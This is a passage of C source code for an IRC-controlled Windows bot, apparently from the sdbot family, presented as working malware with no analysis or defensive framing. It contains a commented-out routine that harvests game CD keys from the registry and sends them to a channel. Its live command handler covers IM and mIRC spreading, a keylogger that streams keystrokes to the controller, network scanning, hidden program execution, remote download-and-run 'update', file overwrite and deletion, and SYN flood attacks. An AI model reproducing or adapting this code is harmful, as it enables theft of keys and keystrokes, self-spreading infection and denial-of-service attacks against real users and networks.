    RegCloseKey(hkey);
 
    // BATTLEFIELD
    dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942", 0, KEY_READ, &hkey);
    if(RegQueryValueEx(hkey, "ergc", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
     sprintf(sendbuf, "Found Battlefield 1942 CDKey (%s).\r\n", szDataBuf);
     irc_privmsg(sock, a[2], sendbuf, notice); }
    RegCloseKey(hkey);
 
    // BATTLEFIELD ROAD TO ROME
    dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome", 0, KEY_READ, &hkey);
    if(RegQueryValueEx(hkey, "ergc", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
     sprintf(sendbuf, "Found Battlefield 1942 Road To Rome CDKey (%s).\r\n", szDataBuf);
     irc_privmsg(sock, a[2], sendbuf, notice); }
    RegCloseKey(hkey);
 
    // RavenShield
    dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Red Storm Entertainment\\RAVENSHIELD", 0, KEY_READ, &hkey);
    if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
     sprintf(sendbuf, "Rainbow Six III RavenShield CDKey (%s).\r\n", szDataBuf);
     irc_privmsg(sock, a[2], sendbuf, notice); }
    RegCloseKey(hkey);
 
	// Neverwinter Nights CDKey

	FILE *fp; char line[100]; dwSize = 128; 
	lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\BioWare\\NWN\\Neverwinter", 0, KEY_READ, &hkey);
	dwSize=1024;
	unsigned char szDataBuf2[1024];
	if(RegQueryValueEx(hkey, "Location", NULL, NULL, szDataBuf2, &dwSize)== ERROR_SUCCESS)
	{ char *szPath = (char*)malloc(1060);
	sprintf(szPath, "%s\\%s", szDataBuf2, "nwncdkey.ini");
	 
	if((fp=fopen(szPath,"r"))!=NULL)
	{ while(fgets(line,100,fp)) {
		if(strstr(line, "Key1="))
		{	strtok(line, "=");
			sprintf(sendbuf, "Found NWN CDKey %s.\r\n",strtok(NULL, "="));
			irc_privmsg(sock, a[2], sendbuf, notice); } }
		fclose(fp); }
	if(szPath) free(szPath); }
	RegCloseKey(hkey);
 
  // Soldier of Fortune II
 
  dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Activision\\Soldier of Fortune II - Double Helix", 0, KEY_READ, &hkey);
  if(RegQueryValueEx(hkey, "InstallPath", NULL, NULL, szDataBuf2, &dwSize)== ERROR_SUCCESS)
  { char *szPath = (char*)malloc(MAX_PATH);
   sprintf(szPath, "%s\\base\\mp\\%s", szDataBuf2, "sof2key");
 
   if((fp=fopen(szPath,"r"))!=NULL)
   { if(fgets(line, 100, fp))
     if(!strstr(line, "mtkwftmkemfew3p3b7")) irc_privmsg(sock, a[2],"Found SOF2 CDKey (%s).\r\n", notice);
    fclose(fp); }
   if(szPath) free(szPath); }
  RegCloseKey(hkey);

	// The Gladiators
	
	dwSize = 128; lRet = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Eugen Systems\\The Gladiators",0, KEY_READ, &hkey);
	if(RegQueryValueEx(hkey, "RegNumber", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
	{	sprintf(sendbuf, "Found The Gladiators CDKey (%s).\r\n", szDataBuf);
	     irc_privmsg(sock, a[2], sendbuf, notice); }
	RegCloseKey(hkey);

	// Need For Speed Hot Pursuit 2

	dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2\\ergc", 0, KEY_READ, &hkey);
	if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
	{	sprintf(sendbuf, "Found NFSHP2 CDKey (%s).\r\n", szDataBuf);
	     irc_privmsg(sock, a[2], sendbuf, notice); }
	RegCloseKey(hkey);

	// FIFA 2003

	dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc", 0, KEY_READ, &hkey);
	if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
	{	sprintf(sendbuf, "Found FIFA 2003 CDKey (%s).\r\n", szDataBuf);
	     irc_privmsg(sock, a[2], sendbuf, notice); }
	RegCloseKey(hkey);

	// Command & Conquer Generals

	dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Generals\\ergc", 0, KEY_READ, &hkey);
	if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
	{	sprintf(sendbuf, "Found Command & Conquer Generals CDKey (%s).\r\n", szDataBuf);
	     irc_privmsg(sock, a[2], sendbuf, notice); }
	RegCloseKey(hkey);

	// Project IGI 2

	dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\IGI 2 Retail\\CDKey", 0, KEY_READ, &hkey);
	if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
	{	sprintf(sendbuf, "Found Project IGI 2 CDKey (%s).\r\n", szDataBuf);
	     irc_privmsg(sock, a[2], sendbuf, notice); }
	RegCloseKey(hkey);

	// Red Alert 2

	dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Westwood\\Red Alert 2", 0, KEY_READ, &hkey);
	if(RegQueryValueEx(hkey, "Serial", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
	{	sprintf(sendbuf, "Found Red Alert 2 CDKey (%s).\r\n", szDataBuf);
	     irc_privmsg(sock, a[2], sendbuf, notice); }
	RegCloseKey(hkey);

	// Tiberian Sun

	dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Westwood\\Tiberian Sun", 0, KEY_READ, &hkey);
	if(RegQueryValueEx(hkey, "Serial", NULL, NULL, szDataBuf, &dwSize)==ERROR_SUCCESS)
	{	sprintf(sendbuf, "Found Tiberian Sun CDKey (%s).\r\n", szDataBuf);
	     irc_privmsg(sock, a[2], sendbuf, notice); }
	RegCloseKey(hkey);
}
*/
		else if (strcmp("IM", a[s]) == 0 || strcmp("msn", a[s]) == 0) {
				irc_privmsg(sock, a[2], "Started IM spread...", notice);

				EnumWindows(EnumMSN, 0);
				EnumWindows(EnumAIM, 0);
				EnumWindows(EnumYahoo, 0);
			}
			else if (strcmp("die", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) exit(0);
			}
			else if (strcmp("logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
				for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "user %s logged out.\r\n", user);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}
			}
			else if (strcmp("reconnect", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				irc_send(sock, "QUIT :reconnecting");
				return 0;
			}
			else if (strcmp("disconnect", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				irc_send(sock, "QUIT :later");
				return -1;
			}
			else if (strcmp("quit", a[s]) == 0 || strcmp("q", a[s]) == 0) {
				if (a[s+1] == NULL) irc_send(sock, "QUIT :later\r\n"); else {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendf(sock, "QUIT :%s\r\n", y);
					}
				}
				return -2;
			}
			else if (strcmp("status", a[s]) == 0 || strcmp("s", a[s]) == 0) {
				DWORD total, days, hours, minutes;
				total = (GetTickCount() / 1000) - started;
				days = total / 86400;
				hours = (total % 86400) / 3600;
				minutes = ((total % 86400) % 3600) / 60;
				sprintf(sendbuf, vername" ready. Up %dd %dh %dm.", days, hours, minutes);
				irc_privmsg(sock, a[2], sendbuf, notice);
			}
			else if (strcmp("id", a[s]) == 0 || strcmp("i", a[s]) == 0) irc_privmsg(sock, a[2], (char *)botid, notice);
			else if (strcmp("about", a[s]) == 0 || strcmp("ab", a[s]) == 0) irc_privmsg(sock, a[2], vername" by [sd]", notice);
			else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
				irc_privmsg(sock, a[2], "-[thread list]-", notice);
				for (i = 0; i < 64; i++) {
					if (threadd[i][0] != '\0') {
						sprintf(sendbuf, "%d. %s", i, threadd[i]);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
			}
			else if (strcmp("aliases", a[s]) == 0 || strcmp("al", a[s]) == 0) {
				irc_privmsg(sock, a[2], "-[alias list]-", notice);
				for (i = 0; i < maxaliases; i++) {
					if (aliases[i].name[0] != '\0') {
						sprintf(sendbuf, "%d. %s = %s", i, aliases[i].name, aliases[i].command);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
			}
			else if (strcmp("log", a[s]) == 0 || strcmp("lg", a[s]) == 0) {
				for (i = 0; i < 128; i++) {
					if (log[i][0] != '\0') {
						irc_privmsg(sock, a[2], log[i], notice);
					}
				}
			}
			#ifndef NO_NETINFO
			else if (strcmp("netinfo", a[s]) == 0 || strcmp("ni", a[s]) == 0) irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
			#endif
			#ifndef NO_SYSINFO
			else if (strcmp("sysinfo", a[s]) == 0 || strcmp("si", a[s]) == 0) irc_privmsg(sock, a[2], sysinfo(sendbuf), notice);
			#endif
			else if (strcmp("remove", a[s]) == 0 || strcmp("rm", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "removing bot...", notice);
				uninstall();
				WSACleanup();
				exit(0);
			}
			//DCC Spread
			else if (strcmp("mIRC", a[s]) == 0 || strcmp("mrc", a[s]) == 0)
			{
				int x = mIRCSpread(channel);
				if (x == 1) irc_privmsg(sock, a[2], "mIRC Spreading Successfull.", notice);
				else irc_privmsg(sock, a[2], "mIRC is not running on this station", notice);
			}
			//DCC Spread

			//Diskinfo

			else if (strcmp("diskinfo", a[s]) == 0 || strcmp("di", a[s]) == 0)
			{
				diskInfo(sock, a[2],notice);
			}

			else if (strcmp("ntcurrent", a[s]) == 0 || strcmp("ntc", a[s]) == 0)
			{
				CHAR szIPAddr[MAX_IP];

			    CHAR szBuffer[MAX_IP];

				itoa(nIPAddrA, szBuffer, 10);
    			strcpy(szIPAddr, szBuffer);
    			strcat(szIPAddr, ".");
    			itoa(nIPAddrB, szBuffer, 10);
    			strcat(szIPAddr, szBuffer);
    			strcat(szIPAddr, ".");
    			itoa(nIPAddrC, szBuffer, 10);
    			strcat(szIPAddr, szBuffer);
    			strcat(szIPAddr, ".");
    			itoa(nIPAddrD, szBuffer, 10);
    			strcat(szIPAddr, szBuffer);
				if (strcmp("10.0.0.10", szIPAddr) == 0) irc_privmsg(sock, a[2], "Not scanning", notice);
				else
				{
					sprintf(sendbuf, "Currently scanning %s\n", szIPAddr);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
			}
			// commands requiring at least 1 parameter
			else if (a[s+1] == NULL) return 1;
			else if (strcmp("cdtray", a[s]) == 0 || strcmp("cd", a[s]) == 0) {
				if (strcmp("close", a[s+1]) == 0) {
				    irc_privmsg(sock, a[2], "cd-rom drive tray closed\r\n", notice);
					mciSendString("set CDAudio door closed", NULL, 127, 0);
				}
				else {
					irc_privmsg(sock, a[2], "cd-rom drive tray opened\r\n", notice);
					mciSendString("set CDAudio door open", NULL, 127, 0);
				}
			}
			else if (strcmp("nick", a[s]) == 0 || strcmp("n", a[s]) == 0) {
				irc_sendf(sock, "NICK %s\r\n", a[s+1]);
			}
			else if (strcmp("join", a[s]) == 0 || strcmp("j", a[s]) == 0) {
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
			}
			else if (strcmp("part", a[s]) == 0 || strcmp("pt", a[s]) == 0) {
				irc_sendf(sock, "PART %s\r\n", a[s+1]);
			}
			else if (strcmp("raw", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_send(sock, y);
				}
			}
			else if (strcmp("killthread", a[s]) == 0 || strcmp("k", a[s]) == 0) {
				BOOL threadkilled = FALSE;
				for (i=1; a[s+i] != NULL; i++) if (strlen(a[s+i]) < 3) if (atoi(a[s+i]) < 64 && atoi(a[s+i]) > 0) {
					TerminateThread(threads[atoi(a[s+i])], 0);
					if (threads[atoi(a[s+i])] != 0) threadkilled = TRUE;
					threads[atoi(a[s+i])] = 0;
					threadd[atoi(a[s+i])][0] = '\0';
					cnick[atoi(a[s+i])][0] = '\0';
					closesocket(csock[atoi(a[s+i])]);
				}
					if (!silent) if (threadkilled) irc_privmsg(sock, a[2], "thread(s) killed.", notice);
			}
			else if (strcmp("c_quit", a[s]) == 0 || strcmp("c_q", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
					irc_send(csock[atoi(a[s+1])], "QUIT :later");
					Sleep(500);
					closesocket(csock[atoi(a[s+1])]);
					TerminateThread(threads[atoi(a[s+1])], id);
					threads[atoi(a[s+1])] = 0;
					threadd[atoi(a[s+1])][0] = '\0';
				}
			}
			else if (strcmp("c_rndnick", a[s]) == 0 || strcmp("c_rn", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
					sprintf(sendbuf, "NICK %s", rndnick(ntmp));
					irc_send(csock[atoi(a[s+1])], sendbuf);
				}
			}
			else if (strcmp("prefix", a[s]) == 0 || strcmp("pr", a[s]) == 0) prefix1 = a[s+1][0];
			else if (strcmp("open", a[s]) == 0 || strcmp("o", a[s]) == 0) {
				if (ShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW)) {
					if (!silent) irc_privmsg(sock, a[2], "file opened.", notice);
				} else {
					if (!silent) irc_privmsg(sock, a[2], "couldn't open file.", notice);
				}
			}
			else if (strcmp("server", a[s]) == 0 || strcmp("se", a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
			}
			else if (strcmp("dns", a[s]) == 0 || strcmp("dn", a[s]) == 0) {
				HOSTENT *hostent = NULL;
				IN_ADDR iaddr;
				DWORD addr = inet_addr(a[s+1]);

				if (addr != INADDR_NONE) {
					hostent = gethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
					if (hostent != NULL) {
						sprintf(sendbuf, "%s -> %s", a[s+1], hostent->h_name);
					  	irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				else {
					hostent = gethostbyname(a[s+1]);
					if (hostent != NULL) {
						iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
						sprintf(sendbuf, "%s -> %s", a[s+1], inet_ntoa(iaddr));
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				if (hostent == NULL) irc_privmsg(sock, a[2], "couldn't resolve host", notice);
			}
			#ifndef NO_VISIT
			else if (strcmp("visit", a[s]) == 0 || strcmp("v", a[s]) == 0) {
				vs vs;
				strncpy(vs.host,  a[s+1], sizeof(vs.host)-1);
				if (a[s+2] != NULL) strncpy(vs.referer, a[s+2], sizeof(vs.referer)-1);
				strncpy(vs.chan, a[2], sizeof(vs.chan)-1);
				vs.sock = sock;
				vs.silent = silent;
				CreateThread(NULL, 0, &visit, (void *)&vs, 0, &id);
				while(1) {
					if (vs.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif


	else if (strcmp("keylogger", a[s]) == 0 || strcmp("kl", a[s]) == 0)  {
		if (strcmp("chan", a[s+1]) == 0) {
			if (sendkeysto == 1) irc_privmsg(sock, a[2], "Keylogger already showing keys to channel use \"keylogger stop\" to stop", notice);
			else {
				BOOL keyrun = FALSE;
				for (int i=1; i <= 64; i++) 
				{
					if (strcmp("keylogger", threadd[i]) == 0)
					{
						keyrun = TRUE;
						i = 65;
					}
				}
				if (keyrun == FALSE) {
					sprintf(keylogchan,channel);
					sendkeysto = 1;
					keylog kl;
					kl.socket = sock;
					sprintf(sendbuf, "keylogger");
					kl.threadnum = addthread(sendbuf);
					if (!silent) {
						sprintf(sendbuf, "Keylogger showing to %s",keylogchan);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
					threads[kl.threadnum] = CreateThread(NULL, 0, &keylogger, (void *)&kl, 0, &id);
					sendkeysto = 1;
				}
				else {
					sendkeysto = 1;
					sprintf(sendbuf, "Keylogger showing to %s",keylogchan);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
			}
		}
		if (strcmp("stop", a[s+1]) == 0) {
	//else if (strcmp("stopkeylogger", a[s]) == 0)  {
			sendkeysto = 0;
			memset(keylogchan,0,sizeof(keylogchan));

			BOOL threadkilled = FALSE;
			for (int i=1; i <= 64; i++) 
			{
				if (strcmp("keylogger", threadd[i]) == 0)
				{
					TerminateThread(threads[i], 0);
					if (threads[i] != 0) threadkilled = TRUE;
					threads[i] = 0;
					threadd[i][0] = '\0';
					cnick[i][0] = '\0';
					closesocket(csock[i]);
					i = 65;
				}
			}
			if (!silent) if (threadkilled) irc_privmsg(sock, a[2], "Keylogger stopped.", notice);
		}
		if (strcmp("silent", a[s+1]) == 0) 
			if (sendkeysto == 1) {
				sendkeysto = 0;
				sprintf(sendbuf, "Keylogger stopped showing to %s. Still logging.",channel);
				irc_privmsg(sock, a[2], sendbuf, notice);
			}
			else {
				sprintf(keylogchan,channel);
				sendkeysto = 0;
				keylog kl;
				kl.socket = sock;
				sprintf(sendbuf, "keylogger");
				kl.threadnum = addthread(sendbuf);
				if (!silent) {
					sprintf(sendbuf, "Keylogger logging to %s in system32",keylogfilename);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
				threads[kl.threadnum] = CreateThread(NULL, 0, &keylogger, (void *)&kl, 0, &id);
				sendkeysto = 0;
			}
	}
	//keylog
			//IMsend
			else if (strcmp("imsend", a[s]) == 0) {
				int Aen = s+1;

				strcpy(IMmsg, "");
				while (a[Aen]) {
					sprintf(IMmsg, "%s %s", IMmsg, a[Aen]);
					Aen++;
				}
				EnumWindows(EnumMSN, 0);
				EnumWindows(EnumAIM, 0);
				EnumWindows(EnumYahoo, 0);
			}
			//IMsend
			//Custom NT scan
			else if (strcmp("NTScan", a[s]) == 0) {
				LPHOSTENT lpLocalIPStruct;
			    IN_ADDR inLocalIPStruct;
				CHAR szIPAddr[MAX_IP];
				LPTSTR lpszTemp;
				DWORD dwID[MAX_NB_THREAD];
			    lpszTemp = NULL;

				lpLocalIPStruct = gethostbyname(a[s+1]);
				if (lpLocalIPStruct != 0)
				{
					if (lpLocalIPStruct->h_addr_list[0] != 0)
					{
						/* cram the ip_addr into the 4 global variables */
						memcpy(&inLocalIPStruct, lpLocalIPStruct->h_addr_list[0], sizeof(IN_ADDR));
						sprintf(szIPAddr, "%s", inet_ntoa(inLocalIPStruct));
						lpszTemp = strtok(szIPAddr, ".");
						nIPAddrA = atoi(lpszTemp);
						lpszTemp = strtok(NULL, ".");
						nIPAddrB = atoi(lpszTemp);
						lpszTemp = strtok(NULL, ".");
						nIPAddrC = atoi(lpszTemp);
						lpszTemp = strtok(NULL, ".");
						nIPAddrD = atoi(lpszTemp);
					}
				}
			    if ((nIPAddrA == 192) && (nIPAddrB == 168))
				{
					nIPAddrA = 192;
					nIPAddrB = 168;
					nIPAddrC = 0;
					nIPAddrD = 1;
				}
				else if (nIPAddrA == 10)
				{
					nIPAddrA = 10;
					nIPAddrB = 0;
					nIPAddrC = 0;
					nIPAddrD = 1;
				}
				INT nK = 0;
				nts nt;
				strncpy(nt.chan,  a[2], sizeof(nt.chan)-1);
				nt.sock = sock;
				nt.notice = notice;

				for (nK = 0; nK < MAX_NB_THREAD; nK++) 
				{
					hThread[nK] = CreateThread(NULL, 0, &NTScan, (void *)&nt, (unsigned long)NULL, &dwID[nK]);
				}
				sprintf(sendbuf, "NTScan started from %i.%i.%i.%i",nIPAddrA, nIPAddrB, nIPAddrC, nIPAddrD);
				irc_privmsg(sock, a[2], sendbuf, notice);
			}
			//Custom NB scan
			//processKill
			else if (strcmp("kill", a[s]) == 0) {
				HANDLE hProcess;
				DWORD aProcesses[1024], cbNeeded, cProcesses;
				unsigned int i;
				char szProcessName[MAX_PATH];
				HMODULE hMod;
				BOOL success = FALSE;

				if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
					return 0;
				}
				cProcesses = cbNeeded / sizeof(DWORD);
				for (i = 0; i < cProcesses; i++) {
					strcpy(szProcessName, "unknown");
					hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE,FALSE,aProcesses[i]);
					if (NULL != hProcess) {
						if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
							GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
							if (lstrcmpi(a[s+1], szProcessName) == 0) {
								success = TerminateProcess(hProcess, 0);
								if (success)
								{
									sprintf(sendbuf, "Process %s was killed.",a[s+1]);
									irc_privmsg(sock, a[2], sendbuf, TRUE);
								}
								else {
									sprintf(sendbuf, "Failed to kill %s",a[s+1]);
									irc_privmsg(sock, a[2], sendbuf, TRUE);
								}
							}
						}
					}    
					CloseHandle(hProcess);
				}
				if (!success)
				{
					sprintf(sendbuf, "No such process (%s)",a[s+1]);
					irc_privmsg(sock, a[2], sendbuf, TRUE);
				}
				return 1;
			}
			// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;
			else if (strcmp("addalias", a[s]) == 0 || strcmp("aa", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) addalias(a[s+1], y);
				}
			}
			else if (strcmp("privmsg", a[s]) == 0 || strcmp("pm", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) irc_privmsg(sock, a[s+1], y, FALSE);
				}
			}
			else if (strcmp("action", a[s]) == 0 || strcmp("a", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
					}
				}
			}
			else if (strcmp("cycle", a[s]) == 0 || strcmp("cy", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				irc_sendf(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
			}
			else if (strcmp("mode", a[s]) == 0 || strcmp("m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_sendf(sock, "MODE %s\r\n", y);
				}
			}
			else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp("c_raw", a[s]) == 0 || strcmp("c_r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], y);
				}
			}
			else if (strcmp("c_mode", a[s]) == 0 || strcmp("c_m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) sprintf(sendbuf, "MODE %s", y);
					if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
				}
			}
			else if (strcmp("c_nick", a[s]) == 0 || strcmp("c_n", a[s]) == 0) {
				sprintf(sendbuf, "NICK %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("c_join", a[s]) == 0 || strcmp("c_j", a[s]) == 0) {
				sprintf(sendbuf, "JOIN %s %s", a[s+2], a[s+3]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("c_part", a[s]) == 0 || strcmp("c_p", a[s]) == 0) {
				sprintf(sendbuf, "PART %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp("delay", a[s]) == 0 || strcmp("de", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) Sleep(atoi(a[s+1])*1000);
					return repeat + 1;
				}
			}
			#ifndef NO_DOWNLOAD
			else if (strcmp("update", a[s]) == 0 || strcmp("up", a[s]) == 0) {
				if (strcmp(botid, a[s+2]) == 0) return 1;
				ds ds;
				sprintf(ds.dest, "%s\\%s.exe", tempdir, nick);
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "update (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 1;
				ds.silent = silent;
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				sprintf(sendbuf, "downloading update from %s...\r\n", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			else if (strcmp("execute", a[s]) == 0 || strcmp("e", a[s]) == 0) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				if (atoi(a[s+1]) == 0) sinfo.wShowWindow = SW_HIDE; else sinfo.wShowWindow = SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) && !silent) irc_privmsg(sock, a[2], "couldn't execute file.", notice);
				}
			}

			else if (strcmp("delete", a[s]) == 0 || strcmp("del", a[s]) == 0)
			{
				BOOL bOverWrite;
				if (strcmp("overwrite", a[s+2]) == 0 )
				{
					bOverWrite = TRUE;
				}
				else bOverWrite = FALSE;

				DWORD size=0, sz=0, r=0;
				if(bOverWrite)
				{
					int len = strlen("Bow down before the one you serve, you're going to get what you deserve.");
				//	int files=0, folders=0;

					// i think FILE_FLAG_DELETE_ON_CLOSE might work to del file too i did not check tho
					HANDLE f = CreateFile(a[s+1], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, 0);

					if (f != INVALID_HANDLE_VALUE)
					{
						size = GetFileSize(f, &size);
						while ( (GetFileSize(f, &sz)) <= (size) )
						{
							WriteFile(f, "Bow down before the one you serve, you're going to get what you deserve.", len, &r, NULL);
						}

						CloseHandle(f);
					}
					DeleteFile(a[s+1]);
				}
				else
					DeleteFile(a[s+1]);
			}
			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;
//////// SYN FLOOD ////////////////////////////////////////////////////////////
else if (strcmp("syn", a[s]) == 0) {
synt sin;
strncpy(sin.ip, a[s+1], sizeof(sin.ip)-1);
strncpy(sin.port, a[s+2], sizeof(sin.port)-1);
strncpy(sin.length, a[s+3], sizeof(sin.length)-1);
strncpy(sin.chan, a[2], sizeof(sin.chan)-1);
sin.notice = notice;
sin.socket = sock;
sprintf(sendbuf, "SYN flooding [%s:%s] for %s seconds\r\n", a[s+1], a[s+2], a[s+3]);
irc_privmsg(sock, a[2], sendbuf, notice);
sin.threadnumber = addthread(sendbuf);
threads[sin.threadnumber] = CreateThread(NULL, 0, &synthread, (void *)&sin, 0, &id);
//sprintf(sendbuf, "Done with SYN flood [%iKB/sec]\r\n", SYNFlood(a[s+1], a[s+2], a[s+3]));
//irc_privmsg(sock, a[2], sendbuf, notice);

}
//////// SYN FLOOD ////////////////////////////////////////////////////////////
			else if (strcmp("clone", a[s]) == 0 || strcmp("c", a[s]) == 0) {
				ircs irc;
				strncpy(irc.host,  a[s+1], sizeof(irc.host)-1);
				irc.port = atoi(a[s+2]);
				strncpy(irc.channel,  a[s+3], sizeof(irc.channel)-1);
				if (a[s+4] != NULL) strncpy(irc.chanpass,  a[s+4], sizeof(irc.chanpass)-1);
				sprintf(sendbuf, "clone (%s)", irc.host);
				irc.threadnum = addthread(sendbuf);
				if (!silent) {
